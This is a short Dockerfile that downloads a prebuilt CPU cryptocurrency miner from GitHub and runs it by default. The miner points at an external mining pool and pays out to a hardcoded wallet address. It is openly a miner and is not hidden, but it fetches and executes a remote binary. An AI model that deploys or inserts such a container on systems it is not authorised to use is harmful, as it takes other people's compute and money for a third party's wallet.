FROM ubuntu:latest
WORKDIR /bin
RUN apt-get update
RUN apt-get install wget --yes
RUN  wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.29/cpuminer-opt-linux.tar.gz
RUN tar -xf cpuminer-opt-linux.tar.gz 
RUN chmod +x cpuminer-sse2
CMD ["cpuminer-sse2", "-a", "yespower", "-o", "stratum+tcps://stratum-na.rplant.xyz:17079", "-u", "oL7AipLLk1JaSEAV1h4Lg3uXdv2sPJ9wpT.docker", "-p", "m=solo"]
